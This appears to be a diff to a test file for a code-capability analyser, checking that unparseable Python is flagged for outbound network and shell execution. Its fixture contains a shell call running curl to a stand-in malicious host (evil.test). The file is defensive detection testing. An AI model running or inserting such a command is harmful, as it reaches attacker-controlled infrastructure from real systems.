@@ -98,4 +98,4 @@ def test_generic_ruby_file_reports_url_and_exec_at_low_confidence():
 
 def test_python_that_does_not_parse_falls_back_to_generic():
     caps = python_ast.analyze(entry('def x(:\n  os.system("curl https://evil.test/a")\n', "a.py", "python"))
-    assert {"obfuscation", "net.outbound", "exec.shell"} <= kinds(caps)
+    assert {"unparsed", "net.outbound", "exec.shell"} <= kinds(caps)
